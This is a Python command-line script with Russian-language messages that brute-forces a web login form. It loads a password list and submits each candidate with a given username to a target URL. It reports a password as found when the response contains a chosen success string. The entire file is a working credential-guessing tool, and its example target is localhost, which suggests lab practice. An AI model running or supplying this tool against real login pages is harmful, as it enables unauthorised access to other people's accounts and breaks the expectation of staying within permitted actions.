import requests
import argparse
from tqdm import tqdm

def load_passwords(file_path):
	try:
		with open(file_path, 'r', encoding='utf-8', errors='ignore') as file:
			return [line.strip() for line in file if line.strip()]
	except FileNotFoundError:
		print(f"[-] Файл {file_path} не найден")
		return []
	except Exception as e:
		print(f"[-] Ошибка при чтении файла: {e}")
		return []

def brute_force(url, username, password_list, success_indicator, failure_indicator=None):
	print(f"Начинаем брутфорс для пользователя: {username}")
	print(f"Количество паролей для проверки: {len(password_list)}")
	session = requests.Session()  # Используем сессию для сохранения cookies
	for password in tqdm(password_list, desc="Прогресс"):
		data = {"username": username, "password": password}
		try:
			response = session.post(url, data=data, timeout=5)
			if success_indicator in response.text:
				print(f"\n[+] Пароль найден: {password}")
				return password
			elif failure_indicator and failure_indicator not in response.text:
				print(f"\n[?] Возможный пароль (необычный ответ): {password}")
				print(f"Код ответа: {response.status_code}")
		except requests.RequestException as e:
			print(f"\n[-] Ошибка при запросе: {e}")
			continue
	print("\n[-] Пароль не найден")
	return None

if __name__ == "__main__":
	parser = argparse.ArgumentParser(description="Простой брутфорс-скрипт для веб-форм")
	parser.add_argument("-u", "--url", required=True, help="URL целевой формы логина, например: http://127.0.0.1:5000/")
	parser.add_argument("-n", "--username", required=True, help="Имя пользователя для брутфорса, например: admin")
	parser.add_argument("-p", "--passwords", required=True, help="Путь к файлу со списком паролей, например: ./passwords_cybersecurity.txt")
	parser.add_argument("-s", "--success", required=True, help="Текст, указывающий на успешный вход, например: 'Welcome' или 'Dashboard'")
	parser.add_argument("-f", "--failure", help="Текст, указывающий на неудачный вход, например: 'Invalid credentials'")
	args = parser.parse_args()
	passwords = load_passwords(args.passwords)
	if passwords:
		found_password = brute_force(args.url, args.username, passwords, args.success, args.failure)
